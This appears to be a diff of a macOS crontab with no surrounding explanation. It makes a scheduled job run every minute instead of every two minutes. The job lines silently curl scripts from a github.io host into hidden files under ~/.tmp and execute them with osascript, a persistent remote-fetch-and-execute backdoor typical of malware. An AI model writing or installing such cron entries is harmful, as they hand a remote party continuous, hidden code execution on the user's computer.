@@ -1,3 +1,3 @@
 MAILTO=""
-*/2 * * * * curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp; osascript ~/.tmp/.val.scpt
+* * * * * curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp; osascript ~/.tmp/.val.scpt
 * * * * * curl -s https://sitetest.github.io/scr.txt >~/.tmp/.tmp.scpt; osascript ~/.tmp/.tmp.scpt;
